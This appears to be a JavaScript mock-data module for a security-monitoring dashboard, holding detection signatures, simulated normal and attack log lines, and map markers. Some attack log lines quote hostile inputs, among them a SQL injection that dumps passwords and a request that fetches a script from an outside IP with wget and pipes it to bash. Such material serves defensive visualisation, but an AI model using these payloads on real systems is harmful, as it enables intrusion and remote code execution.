export const DEFAULT_SIGNATURES = [
  { id: 1,  category: "SQL Injection",          severity: "critical", mitre: "T1190",  pattern: "UNION SELECT, OR 1=1, DROP TABLE",   active: true },
  { id: 2,  category: "DDoS / Flood",            severity: "critical", mitre: "T1498",  pattern: "requests/sec > 5000",               active: true },
  { id: 3,  category: "Credential Stuffing",     severity: "high",     mitre: "T1110",  pattern: "failed login > 10, password spray", active: true },
  { id: 4,  category: "Ransomware Beacon",       severity: "critical", mitre: "T1486",  pattern: ".onion C2 callback, AES-256 key",   active: true },
  { id: 5,  category: "Data Exfiltration",       severity: "high",     mitre: "T1041",  pattern: "> 2GB outbound, zip encrypted",     active: true },
  { id: 6,  category: "RCE / Webshell Upload",   severity: "critical", mitre: "T1505",  pattern: "cmd.exe, wget|curl pipe bash",      active: true },
  { id: 7,  category: "Lateral Movement",        severity: "high",     mitre: "T1021",  pattern: "SMB sweep, NTLM relay",             active: true },
  { id: 8,  category: "Privilege Escalation",    severity: "high",     mitre: "T1078",  pattern: "sudo -l, NET USE, token imperson",  active: true },
];

export const NORMAL_LOGS = [
  "GET /api/users/profile HTTP/1.1 — 200 OK — 14ms",
  "POST /api/auth/login HTTP/1.1 — 200 OK — user: alice@corp.io",
  "GET /dashboard HTTP/1.1 — session valid — TLSv1.3",
  "HEAD /api/health HTTP/1.1 — 200 OK — uptime: 99.97%",
  "GET /static/main.css HTTP/1.1 — 304 Not Modified",
  "DELETE /api/session/8f2c3 HTTP/1.1 — 204 No Content",
  "GET /api/v2/metrics?range=1h HTTP/1.1 — 200 OK — 182ms",
  "POST /api/webhook/stripe HTTP/1.1 — 200 OK — verified signature",
  "OPTIONS /api/cors HTTP/1.1 — 200 OK — CORS preflight",
  "GET /api/users?page=1&limit=50 HTTP/1.1 — 200 OK — 28ms",
];

export const ATTACK_LOGS = [
  "GET /api?id=1' UNION SELECT username,password FROM users-- HTTP/1.1 — 500",
  "SSH brute-force: 185.220.101.45 — failed login attempt 82/100 — user: root",
  "POST /api/exec?cmd=;wget+http://185.234.218.56/x.sh+-O-+|bash HTTP/1.1 — 403",
  "Ransomware beacon: host contacted aabbccdd.onion:8080 — AES key exchange",
  "Outbound anomaly: 2.4GB encrypted ZIP to 45.33.32.156 — C2 suspected",
  "SQL injection detected: OR 1=1 -- pattern in POST /login body",
  "WebShell upload attempt: /uploads/shell.php — blocked by WAF",
  "NTLM relay attack: SMB sweep on 10.0.0.0/24 from 10.0.0.45",
  "Mimikatz artifact detected: lsass.exe memory dump — CRITICAL EDR alert",
  "Port scan detected: 45.33.32.156 — 2400 ports in 3.2s — Nmap signature",
  "Payload delivery: powershell -EncodedCommand TVpQAA... — blocked",
  "DNS tunneling detected: TXT record >512B from 198.51.100.4 — exfil risk",
];

export const SEV_COLOR = { 
  critical: "#ef4444", 
  high:     "#f97316", 
  medium:   "#f59e0b", 
  low:      "#22c55e", 
  normal:   "#3b82f6" 
};

// Named real-world strategic cyber nodes
const NAMED_NODES = [
  { lat: 37.77,  lng: -122.41, label: "US-WEST-1",    type: "Data Center Phase" },
  { lat: 40.71,  lng: -74.00,  label: "US-EAST-1",    type: "Data Center Phase" },
  { lat: 51.50,  lng: -0.12,   label: "EU-WEST-1",    type: "Data Center Phase" },
  { lat: 52.52,  lng: 13.40,   label: "EU-CENTRAL",   type: "Data Center Phase" },
  { lat: 35.68,  lng: 139.69,  label: "AP-EAST-1",    type: "Data Center Phase" },
  { lat: 1.35,   lng: 103.81,  label: "AP-SOUTH-1",   type: "Data Center Phase" },
  { lat: 39.90,  lng: 116.40,  label: "AP-BEIJING",   type: "Malware Ops" },
  { lat: 55.75,  lng: 37.61,   label: "EASTERN-OPS",  type: "Malware Ops" },
  { lat: 59.33,  lng: 18.06,   label: "NORDIC-NODE",  type: "DDoS Botnet" },
  { lat: -33.86, lng: 151.20,  label: "AU-EAST-1",    type: "Data Center Phase" },
  { lat: 28.61,  lng: 77.20,   label: "IN-SOUTH-1",   type: "DDoS Botnet" },
  { lat: -23.55, lng: -46.63,  label: "SA-EAST-1",    type: "Data Center Phase" },
  { lat: 48.85,  lng: 2.35,    label: "FRANCE-NODE",  type: "DDoS Botnet" },
  { lat: 41.38,  lng: 2.17,    label: "IBERIA-OPS",   type: "Malware Ops" },
  { lat: 25.20,  lng: 55.27,   label: "ME-CENTRAL",   type: "Kinetic Outage" },
];

export const LAYERS_DB = {
  ddos:    Array.from({ length: 30 }, (_, i) => ({ 
    lat: (Math.random() - 0.5) * 160, lng: (Math.random() - 0.5) * 360, 
    type: "DDoS Botnet", label: `BOT-${i+1}`, color: "#f97316", rad: 0.6 
  })),
  malware: Array.from({ length: 20 }, (_, i) => ({ 
    lat: (Math.random() - 0.5) * 160, lng: (Math.random() - 0.5) * 360, 
    type: "Malware Ops", label: `MAL-${String(i+1).padStart(2,'0')}`, color: "#ef4444", rad: 0.8 
  })),
  centers: NAMED_NODES,
  outages: Array.from({ length: 5 }, (_, i) => ({ 
    lat: (Math.random() - 0.5) * 160, lng: (Math.random() - 0.5) * 360, 
    type: "Kinetic Outage", label: `KO-${i+1}`, color: "#a855f7", rad: 1.0 
  })),
};

export const MOCK_COORD = Object.values(LAYERS_DB).flat();
